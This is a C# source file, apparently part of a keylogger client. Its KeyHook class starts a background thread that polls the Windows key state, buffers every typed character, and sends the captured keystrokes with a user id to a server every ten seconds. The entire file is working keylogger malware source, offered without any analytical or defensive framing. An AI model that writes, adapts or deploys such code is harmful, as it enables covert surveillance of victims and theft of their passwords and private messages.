using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace keylogger_client
{
    public static class KeyHook
    {
        public static event KeyEventDelegate OnKeyDown;
        public static event KeyEventDelegate OnKeyUp;
        public delegate void KeyEventDelegate(Keys key);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        private static DateTime _ticks = DateTime.Now;
        private static Thread _pollingThread;
        private static string _buffer = string.Empty;
        private static volatile Dictionary<Keys, bool> _keysStates = new Dictionary<Keys, bool>();

        /// <summary>
        /// Initialize thread for keylogger
        /// </summary>
        internal static void Initialize()
        {
            if (_pollingThread != null && _pollingThread.IsAlive)
                return;
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                _keysStates[key] = false;
            _pollingThread = new Thread(PollKeys)
            {
                IsBackground = true,
                Name = "KeyThread"
            };
            _pollingThread.Start();
        }

        /// <summary>
        /// Get windows event from keyboard and send data to server each X/s
        /// </summary>
        private static void PollKeys()
        {
            for (;;)
            {
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (((GetAsyncKeyState(key) & (1 << 15)) != 0))
                    {
                        if (_keysStates[key])
                            continue;
                        if (Helper.KeyIsWritable(key))
                        {
                            OnKeyDown?.Invoke(key);
                            _buffer += Helper.CommonKeysConverter.ContainsKey(key) ? Helper.CommonKeysConverter[key] : key.ToString();
                        }
                        _keysStates[key] = true;
                    }
                    else
                    {
                        if (!_keysStates[key])
                            continue;
                        OnKeyUp?.Invoke(key);
                        _keysStates[key] = false;
                    }
                }

                var now = DateTime.Now;
                if ((now - _ticks).TotalSeconds > 10)
                {
                    if (string.IsNullOrEmpty(_buffer))
                        continue;
                    SynchronousClient.Send(@"{""uid"":""" + Helper.GetUid(now) + @""", ""buffer"": """ + _buffer + @"""}");
                    _buffer = string.Empty;
                    _ticks = DateTime.Now;
                }
            }
        }
    }
}
